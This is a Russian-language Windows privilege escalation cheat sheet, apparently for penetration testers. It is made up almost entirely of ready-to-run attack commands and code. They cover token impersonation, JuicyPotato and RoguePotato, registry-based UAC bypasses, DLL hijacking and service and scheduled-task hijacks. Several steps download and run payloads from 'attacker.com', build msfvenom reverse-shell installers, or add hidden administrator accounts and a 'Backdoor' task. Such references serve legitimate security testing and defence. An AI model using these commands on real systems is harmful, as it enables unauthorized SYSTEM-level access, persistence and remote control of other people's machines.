# 🪟 Windows Privilege Escalation Cheat Sheet

**Полное руководство по повышению привилегий в Windows-системах.**  
Включает техники для Token Impersonation, JuicyPotato, UAC Bypass, AlwaysInstallElevated, Unquoted Service Paths, DLL Hijacking и многое другое.

---

## 📚 Оглавление
1. [Базовая разведка](#-базовая-разведка)
2. [Token Impersonation](#-token-impersonation)
3. [JuicyPotato / RoguePotato](#-juicypotato--roguepotato)
4. [UAC Bypass](#-uac-bypass)
5. [AlwaysInstallElevated](#-alwaysinstallelevated)
6. [Unquoted Service Paths](#-unquoted-service-paths)
7. [DLL Hijacking](#-dll-hijacking)
8. [Service Permissions](#-service-permissions)
9. [Scheduled Tasks](#-scheduled-tasks)
10. [Полезные инструменты](#-полезные-инструменты)

---

## 🔍 Базовая разведка

### 1.1 Сбор информации о системе

```powershell
# Информация о системе
systeminfo
hostname
whoami /all
set

# Информация о пользователе и группах
whoami /groups
net user %username%
net localgroup administrators

# Информация о процессах
tasklist /v
Get-Process
wmic process list full

# Сетевая информация
ipconfig /all
netstat -ano
route print
arp -a

# Информация о установленных патчах
wmic qfe list brief
systeminfo | findstr /i "KB"
Get-HotFix

1.2 Поиск конфиденциальных файлов
# Поиск файлов с паролями
findstr /si password *.txt *.ini *.config *.xml 2>nul
dir /s *pass* == *cred* == *vnc* == *.config 2>nul

# Поиск файлов с расширениями
dir /s *.kdbx 2>nul  # KeePass
dir /s *.rdp 2>nul   # RDP файлы
dir /s *.ps1 2>nul   # PowerShell скрипты

# Папки с интересными данными
dir "C:\Users\*\Desktop\"
dir "C:\Users\*\Documents\"
dir "C:\Users\*\Downloads\"

1.3 Поиск записываемых папок
# Поиск папок с правами на запись для текущего пользователя
icacls C:\ProgramData
icacls C:\Windows\Temp
icacls C:\Users\Public

Token Impersonation
2.1 Проверка прав на имперсонацию
# Проверка привилегий
whoami /priv

# Интересующие привилегии:
# SeImpersonatePrivilege - всегда включена для сервисных аккаунтов
# SeAssignPrimaryTokenPrivilege
# SeCreateTokenPrivilege
# SeDebugPrivilege
# SeTakeOwnershipPrivilege

2.2 Эксплуатация через Incognito (Metasploit)
# В Meterpreter сессии
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
execute -f cmd.exe -i

2.3 Эксплуатация через PowerShell
# Использование Invoke-TokenManipulation
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

2.4 Эксплуатация через Windows API (ручная)
// Impersonation.cpp
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hToken)) {
        ImpersonateLoggedOnUser(hToken);
        system("cmd.exe");
    }
    return 0;
}

JuicyPotato / RoguePotato
3.1 JuicyPotato (Windows 7-10, Server 2008-2016)
Принцип: Эксплуатация COM-сервера BITS для получения токена SYSTEM через SeImpersonatePrivilege.
# Загрузка JuicyPotato
certutil -urlcache -f http://attacker.com/JuicyPotato.exe JuicyPotato.exe

# Базовое использование
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > C:\ProgramData\output.txt" -t *
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user attacker password /add" -t *

# Получение reverse shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" -t *

3.2 CLSID для разных версий Windows
Версия Windows	CLSID
Windows 7 / 2008 R2	{F87B28F1-DA9A-4F35-8EC0-491EFCF81370}
Windows 8 / 2012	{4991D34B-80A1-4291-83B6-3328366B9097}
Windows 10 / 2016	{B91D5831-B1BD-4608-8198-D72E155020F7}
Windows 10 / 2019	{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}
# Пример с конкретным CLSID
JuicyPotato.exe -l 1337 -c {F87B28F1-DA9A-4F35-8EC0-491EFCF81370} -p cmd.exe -a "/c whoami"

3.3 RoguePotato (Windows 10/2016/2019)
Принцип: Более стабильная версия JuicyPotato, работает через HTTP сервер.
# На машине атакующего
nc -lvnp 4444

# На целевой машине
RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 1337 -p 4444

3.4 SweetPotato
# Альтернатива JuicyPotato
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c net user admin password /add"
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\ProgramData\test.txt"

UAC Bypass
4.1 Проверка уровня UAC
# Проверка текущего уровня UAC
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Интересующие значения
# ConsentPromptBehaviorAdmin: 0 = отключен, 2 = запрос, 5 = максимальный
# EnableLUA: 0 = отключен, 1 = включен

4.2 Fodhelper UAC Bypass (Windows 10)
# Создание ключа реестра
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Windows\System32\cmd.exe /c whoami > C:\ProgramData\test.txt" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f

# Запуск fodhelper
fodhelper.exe

# Очистка
reg delete HKCU\Software\Classes\ms-settings\ /f

4.3 ComputerDefaults UAC Bypass
# Создание ключа реестра
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c net user attacker password /add && net localgroup administrators attacker /add" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f

# Запуск ComputerDefaults
ComputerDefaults.exe

4.4 SilentCleanup UAC Bypass
# Создание ключа реестра
reg add HKCU\Environment /v windir /d "cmd /c whoami > C:\ProgramData\test.txt & REM " /f

# Запуск schtasks
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

4.5 EventViewer UAC Bypass (Windows 7)
# Создание ключа реестра
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c net user attacker password /add && net localgroup administrators attacker /add" /f

# Запуск eventvwr
eventvwr.exe

4.6 UACMe
# Скачивание UACMe
git clone https://github.com/hfiref0x/UACME
cd UACME

# Запуск методов
# Метод 23 (Windows 10)
Akagi.exe 23 C:\Windows\System32\cmd.exe

# Метод 41 (Windows 7)
Akagi.exe 41 C:\Windows\System32\cmd.exe

AlwaysInstallElevated
5.1 Проверка
# Проверка ключей реестра
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Если оба имеют значение 1 - уязвимо

5.2 Эксплуатация
# Создание MSI пакета
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o reverse.msi

# Запуск MSI
msiexec /quiet /qn /i reverse.msi

# Альтернатива - через PowerShell
msiexec /i http://attacker.com/reverse.msi /quiet /qn

Unquoted Service Paths
6.1 Поиск уязвимых сервисов
# Поиск сервисов с незакавыченными путями
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows\*" -and $_.PathName -like "* *" -and $_.StartMode -eq "Auto"} | Select-Object Name,PathName,StartMode

6.2 Эксплуатация
# Пример: путь "C:\Program Files\MyApp\app.exe"
# Пробуем записать в "C:\Program Files\MyApp.exe" или "C:\Program.exe"

# Создание вредоносного файла
copy C:\Windows\System32\cmd.exe "C:\Program Files\MyApp.exe"

# Перезапуск сервиса
net stop ServiceName
net start ServiceName

DLL Hijacking
7.1 Поиск уязвимых приложений
# Мониторинг загрузки DLL (использовать procmon)
# Procmon -> Filter -> Process Name = target.exe
# Filter -> Result = NAME NOT FOUND

# Процесс не находит DLL и ищет в папке приложения

7.2 Эксплуатация
c:
// dllmain.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user attacker password /add");
        system("cmd.exe /c net localgroup administrators attacker /add");
    }
    return TRUE;
}

cmd:
# Компиляция
x86_64-w64-mingw32-gcc dllmain.c -shared -o malicious.dll

# Размещение DLL в папке приложения
copy malicious.dll "C:\Program Files\Target\missing.dll"

# Запуск приложения от SYSTEM

Service Permissions
8.1 Поиск сервисов с изменяемыми правами
# PowerShell
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $path = $_.PathName
    $perms = (Get-Acl $path).Access
    Write-Host "$($_.Name): $perms"
}

# AccessChk
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "BUILTIN\Users" *
accesschk.exe -uwcqv "NT AUTHORITY\Authenticated Users" *

8.2 Изменение конфигурации сервиса
# Изменение пути к бинарному файлу
sc config ServiceName binPath="C:\malicious.exe"
sc config ServiceName binPath="cmd.exe /c net user attacker password /add"

# Перезапуск сервиса
sc stop ServiceName
sc start ServiceName

8.3 Изменение прав на сервис
# Использование sc
sc sdset ServiceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"

# Использование PowerShell
Set-Service -Name ServiceName -StartupType Automatic

Scheduled Tasks
9.1 Поиск записываемых заданий
# Просмотр заданий
schtasks /query /fo LIST /v

# PowerShell
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

9.2 Эксплуатация
cmd
# Изменение задания
schtasks /change /tn "TaskName" /ru "SYSTEM" /tr "C:\malicious.exe"

# Создание нового задания
schtasks /create /tn "Backdoor" /tr "C:\Windows\System32\cmd.exe /c net user attacker password /add" /sc once /st 00:00 /ru "SYSTEM"

Полезные инструменты
Инструмент	Назначение
WinPEAS	Автоматический скрипт для поиска векторов привилегий
PowerUp	Модуль PowerSploit для проверки привилегий
JuicyPotato	Эксплуатация SeImpersonatePrivilege
RoguePotato	Улучшенная версия JuicyPotato
SweetPotato	Альтернативная версия
UACMe	База методов обхода UAC
AccessChk	Проверка прав доступа (Sysinternals)
SharpUp	C# версия PowerUp
Seatbelt	Сбор информации о системе (GhostPack)
Watson	Поиск отсутствующих патчей

 Источники и дополнительная литература
WinPEAS

PowerSploit

GTFOBins для Windows

PayloadsAllTheThings — Windows PrivEsc

FuzzySecurity — Windows Privilege Escalation
